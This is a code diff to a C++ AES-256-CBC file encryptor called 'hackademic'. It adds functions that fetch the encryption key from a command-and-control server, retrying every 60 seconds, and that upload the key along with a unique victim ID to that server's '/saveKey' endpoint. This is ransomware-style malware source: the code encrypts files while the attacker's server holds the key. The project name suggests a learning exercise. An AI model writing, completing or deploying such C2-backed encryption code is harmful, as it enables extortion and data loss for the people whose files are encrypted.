@@ -1,9 +1,12 @@
 #include "cryptor.h"
 
+#include <cpr/cpr.h>
+#include <chrono>
 #include <cstring>
 #include <filesystem>
 #include <fstream>
 #include <iostream>
+#include <thread>
 #include <string>
 
 #include <openssl/evp.h>
@@ -11,11 +14,12 @@
 
 #define BUFFER_SIZE 1024
 
+
 // CST & DST
 
 AES256CBC::AES256CBC() {
     evp_aes256cbc = EVP_CIPHER_fetch(NULL, "AES-256-CBC", NULL);
-    key = new unsigned char[keySize_];
+    key = new unsigned char[keySize_]();
 }
 
 AES256CBC::~AES256CBC() {
@@ -25,8 +29,6 @@ AES256CBC::~AES256CBC() {
 
 
 // Methods
-
-
 
 bool AES256CBC::decryptFile(std::filesystem::path path) {
     cout() << "[#] Decrypting " << path << "...\n";
@@ -150,9 +152,27 @@ void AES256CBC::generateKey() {
     keyToFile();
 }
 
+void AES256CBC::keyFromC2(const std::string& id) {
+    using namespace std::chrono_literals; // s, ns, ms, etc. | Altho I don't like this
+    while (!*key) {
+        cpr::Response r = 
+            cpr::Get(C2Addr + "/ReturnToSender",cpr::Body{"UniqID="+id});
+        if (r.status_code != 200) {
+            std::this_thread::sleep_for(60s); // Would rather have smth like 60std::chrono_literals::s
+            continue;
+        }
+        cout() << r.text << std::endl;
+        if (r.text.empty())
+            generateKey();
+        else
+            std::memcpy(key, r.text.data(), keySize_*sizeof(char));
+    }
+    cout() << "[i] Fetched key from C2: " << key << std::endl;
+}
+
 void AES256CBC::keyFromFile() {
     std::string keyPath;
-    std::cout << "[/] Enter a path where to read the key from (./key.hackademic): ";
+    std::cout << "[/] Enter a path where to read the key from (default=./key.hackademic): ";
     getline(std::cin, keyPath);
     if (keyPath == "")
         keyPath = "./key.hackademic";
@@ -165,9 +185,22 @@ void AES256CBC::keyFromFile() {
     }
 }
 
+void AES256CBC::keyToC2(const std::string& id) {
+    std::string encodedKey = "123"; // = b64EncodeKey();
+    auto postKey = [&]() {
+        return cpr::Post(C2Addr + "/saveKey",
+                         cpr::Body{"Key=" + encodedKey + "&UniqID=" + id}
+                        );
+    };
+    using namespace std::chrono_literals;
+    while ( postKey().status_code != 200 ) {
+        std::this_thread::sleep_for(60s);
+    }
+}
+
 void AES256CBC::keyToFile() {
     std::string keyPath;
-    std::cout << "[/] Enter a path where to write the key into (default=./key.hackademic): ";
+    std::cout << "[/] Enter a path where to write the key to (default=./key.hackademic): ";
     getline(std::cin, keyPath);
     if (keyPath == "")
         keyPath = "./key.hackademic";
